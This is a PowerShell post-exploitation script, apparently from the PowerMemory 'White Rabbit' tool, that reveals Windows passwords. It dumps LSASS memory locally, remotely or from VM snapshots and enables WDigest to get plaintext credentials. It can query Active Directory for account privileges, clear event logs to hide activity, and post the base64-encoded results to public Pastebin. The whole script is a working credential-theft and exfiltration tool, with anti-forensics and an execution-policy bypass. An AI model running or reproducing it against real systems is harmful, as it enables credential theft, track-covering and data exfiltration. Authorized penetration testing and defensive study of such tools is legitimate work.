#requires -version 2
<#

.SYNOPSIS         
    RWMCRS : Reveal Windows Memory Credentials from a Root Shell...

.DESCRIPTION
    This tool allows to run RWMC from a command line with parameters. Could be interesting in post exploitation audit mode.

.PARAMETER Relaunched
    Help with local admin detection
    0 = not relaunched

.PARAMETER QueryAD
    Query Active Directory to retrieve rights level of found accounts
    1 = query AD
    2 = not query AD

.PARAMETER Target
    1 = Local
    2 = Remote
    3 = "famous" process .dmp
    4 = VM snapshot .dmp

.PARAMETER ComputerName
    If you target a remote computer and that you selected option 2 for Target parameter, enter the target computer name

.PARAMETER ProcessPath
    If you target a dump of the famous process and that you selected option 3 for Target parameter, enter the "famous" process .dmp Path

.PARAMETER SnapshotVMPath
    If you target a dump of a VM snapshot .dmp and that you selected option 4 for Target parameter, enter the VM snapshot .dmp Path

.PARAMETER Mode    
    3    = Windows 2003
    1    = Win 7 and 2008r2
    132  = Win 7 32 bits
    2    = Win 8 and 2012
    2r2  = Win 10 and 2012r2
    232  = Win 10 32 bits
    8.1  = Win 8.1
    2016 = Windows Server 2016
   
.PARAMETER Exfiltrate
    Give to the script your pastebin dev key to export the result to pastebin in base 64 encoding format

.PARAMETER clearEventLog
    Clean your activity

.NOTES
    Version:        0.1
    Author:         Pierre-Alexandre Braeken
    Creation Date:  2015-11-28

.EXAMPLES

Reveal passwords of the local computer accessed from the root shell 
.\White-Rabbit.ps1 -Target 1

Reveal password of the remote computer "DC1" from the root shell and associate account found with Active Directory 
.\White-Rabbit.ps1 -QueryAD 1 -Target 2 -ComputerName DC1

Reveal password from a Virtual Machine dump and exfiltrate result to pastebin
.\White-Rabbit.ps1 -Target 4 -SnapshotVMPath "d:\DC1.dmp" -Exfiltrate "ae9sdfe2545fb6155d8d8bcsd54t68ef"

#>
Param
    (
        [Parameter(Position = 0)]        
        [Int32]   $Relaunched = 0,
        [Int32]   $QueryAD = 2,
        [Int32]   $Target = 1,
        [String]  $ComputerName = "not",
        [String]  $ProcessPath = "not",
        [String]  $SnapshotVMPath = "not",
        [String]   $Mode = "1",
        [String]  $Exfiltrate = "not",
        [Int32]   $clearEventLog = 2

    )
#---------------------------------------------------------[Initialisations]--------------------------------------------------------
Set-StrictMode -version 2

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptParentPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

$loggingFunctions = "$scriptPath\logging\Logging.ps1"
$cryptoFunctions = "$scriptPath\utilities\Crypto.ps1"
$DESXFunctions = "$scriptPath\utilities\DESX.ps1"
$utilsFunctions = "$scriptPath\utilities\Utils.ps1"
$domainFunctions = "$scriptPath\utilities\Domain.ps1"
$vipFunctions = "$scriptPath\utilities\VIP.ps1"
$obsoleteSystemsFunctions = "$scriptPath\legacyOS\Get-InformationsFromLegacyOS.ps1"
$supportedOSSystemsFunctions = "$scriptPath\supportedOS\Get-InformationsFromSupportedOS.ps1"
$snapshotFunctions = "$scriptPath\snapshot\snapshot.ps1"

$global:partOfADomain = 0
$adFlag = 0
$osArchitecture = ""
$operatingSystem = ""
$osArchitectureHost = ""
$operatingSystemHost = ""
$server = ""
$elevate = 0
$dev_key = $null
$snapshot = $false
$toADD = 0
$hostMode = ""

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$scriptName = [System.IO.Path]::GetFileName($scriptFile)
$scriptVersion = "0.4"

if(!(Test-Path $logDirectoryPath)) {
    New-Item $logDirectoryPath -type directory | Out-Null
}

$logFileName = "Log_" + $launchDate + ".log"
$logPathName = "$logDirectoryPath\$logFileName"

$global:streamWriter = @()

#-----------------------------------------------------------[Functions]------------------------------------------------------------

. $loggingFunctions
. $cryptoFunctions
. $DESXFunctions
. $utilsFunctions
. $domainFunctions
. $vipFunctions
. $supportedOSSystemsFunctions
. $obsoleteSystemsFunctions
. $snapshotFunctions

#----------------------------------------------------------[Execution]----------------------------------------------------------

Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter

# Prerequis
Test-InternetConnection

if($relaunched -eq 0) {
<#
    if(!(Test-IsInLocalAdministratorsGroup)) {
        $elevate = 1    
        Bypass-UAC $scriptPath $logDirectoryPath
    }
    else {    #>
$adminFlag = Test-LocalAdminRights
if($adminFlag -eq $false){        
    Write-Log -streamWriter $global:streamWriter -infoToLog "You have to launch this script with local Administrator rights!"
    $scriptPath = Split-Path $MyInvocation.InvocationName   
    $RWMC = $scriptPath + "\White-Rabbit.ps1 1"     
    $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;        
    Stop-Script
}    
    #}
}

switch ($QueryAD){
    "1" {$adFlag = 1}
    "2" {$adFlag = 0}
    "Yes" {$adFlag = 1}
    "No" {$adFlag = 0}
    "Y" {$adFlag = 1}
    "N" {$adFlag = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Active Directory cmdlets will be not used";$adFlag = "0"}
}

switch ($Target){
    "1" {$dump = "gen"}
    "2" {$dump = "remote"}
    "3" {$dump = "dump"}
    "4" {$dump = "snapshot"}
    "0" {Stop-Script}
    "m" {cls;White-MakeMeASandwich;Stop-Script}
    default {Write-Output "The option could not be determined... generate local dump"}
}

Set-ActiveDirectoryInformations $adFlag

if($dump -eq "dump" -or $dump -eq "snapshot") {
    if($dump -eq "dump") {
        $dump = $ProcessPath
    }
    else {
        if($dump -eq "snapshot") {
            $snapshot = $true
            $dump = $SnapshotVMPath
        }
    }
    $mode = Read-Host 'Mode (3 (Windows 2003), 1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 232 (Win 10 32 bits) 8.1 (Win 8.1) or 2016 (Windows Server 2016))?'
    switch ($Mode){
        1 {Write-Output "Try to reveal password for Windows 7 or 2008r2"}
        132 {Write-Output "Try to reveal password for Windows 7 32bits"}
        2 {Write-Output "Try to reveal password for Windows 8 or 2012"}
        "2r2" {Write-Output "Try to reveal password for Windows 10 or 2012r2"}
        "232" {Write-Output "Try to reveal password for Windows 10 32 bits"}
        "8.1" {Write-Output "Try to reveal password for Windows 8.1"}
        3 {Write-Output "Try to reveal password for Windows XP or 2003"}
        "2016" {Write-Output "Try to reveal password for Windows 2016"}
        default {
            Write-Output "The mode could not be determined... terminating"
            Stop-Script
        }
    }
}
else {
    if($dump -eq "remote") { 
        $dump = ""
        if($ComputerName -ne "not") {
            $server = $ComputerName
            $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $server).version
            $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $server).OSArchitecture

            $operatingSystemHost = (Get-WmiObject Win32_OperatingSystem).version
            $osArchitectureHost =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

            $hostMode = Get-OperatingSystemMode $operatingSystemHost $osArchitectureHost
        }
        else {
            Write-Output "You have to enter the -ComputerName parameter"
            Stop-Script
        }
    }
    else {
        if($dump -eq "gen") { 
            $operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
            $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        }
    }
    $mode = Get-OperatingSystemMode $operatingSystem $osArchitecture
}

switch ($clearEventLog){
    "1" {$clearEventLog = 1}
    "2" {$clearEventLog = 0}
    "Yes" {$clearEventLog = 1}
    "No" {$clearEventLog = 0}
    "Y" {$clearEventLog = 1}
    "N" {$clearEventLog = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Cleaning of Event Logs will be not used";$clearEventLog = "0"}
}

if($clearEventLog -eq 1) {
     Stop-Activities
}

if($hostMode -ne "") {
    $modeSave = $mode
    $mode = $hostMode
}

if($mode -eq "2r2" -or $mode -eq "232" -or $mode -eq "2016" -or $mode -eq "8.1") {
    if($mode -eq "2r2") {
        if($snapshot -eq $true) {
            $memoryWalker = "$scriptPath\debugger\2r2vm\cdb.exe"
        }
        else {
            $memoryWalker = "$scriptPath\debugger\2r2\cdb.exe"
        }
    }
    else {
        if($snapshot -eq $true) {
            $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
        }
        else {
            if($mode -eq "2016"){
                $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
            }
            else {
                if($operatingSystem -eq "10.0.10240") {
                    $memoryWalker = "$scriptPath\debugger\2r2\cdb.exe"
                }
                else {
                    $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
                }
            }
        }
    }
    if($dump -eq "gen") {
        Set-WdigestProvider
    }
    else {
        if($dump -eq "" -and (![string]::IsNullOrEmpty($server))){
            Set-RemoteWdigestProvider $server
        }
    }
}
else {
    if($snapshot -eq $true) {
        $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
    }
    else {
        $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
    }
}

if($hostMode -ne "") {
    $mode = $modeSave
}
Set-SymbolServer -CacheDirectory C:\symbols\public -Public -SymbolServers http://msdl.microsoft.com/download/symbols -CurrentEnvironmentOnly
if($dump -eq "gen"){
    if($mode -eq "2r2") {
        $dumpAProcessPath = "$scriptPath\msdsc.exe"
        &$dumpAProcessPath "lsass" "$logDirectoryPath"
    }
    else {
        if($elevate -eq 0) {
            $process = Get-Process lsass 
            Write-Minidump $process $logDirectoryPath                
        }
    }
}
else {
    if($dump -eq ""){
        $computername = $server        
        Remote-Dumping $computername $scriptPath $logDirectoryPath        
    }
    else {
        $file = $dump
    }
}

if($snapshot -eq $false) {
    if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "8.1" -or $mode -eq "232" -or $mode -eq "2016") {    
        Get-SupportedSystemsInformations $buffer $fullScriptPath             
    }
    else {        
        Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
    }
}
else {
    Get-VMSnapshotInformations $buffer $fullScriptPath         
}
Remove-Item -Recurse -Force c:\symbols
End-Log -streamWriter $global:streamWriter

#$global:returnObjectRWMC = New-Object PSObject -Property $global:streamWriter

return $global:streamWriter # $logPathName

if($clearEventLog -eq 1) {
     Clear-Activities $scriptPath
}

if($ExFiltrate -ne "not") {           
    Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
    $dataToExfiltrate = Get-Content $logPathName
    $utfEncodedBytes  = [System.Text.Encoding]::UTF8.GetBytes($dataToExfiltrate)
    $pasteValue = [System.Convert]::ToBase64String($utfEncodedBytes)
    $pasteName = "PowerMemory (Follow the White Rabbit)"    
    $url = "https://pastebin.com/api/api_post.php"
    $parameters = "&api_option=paste&api_dev_key=$ExFiltrate&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
    Post-HttpRequest $url $parameters
}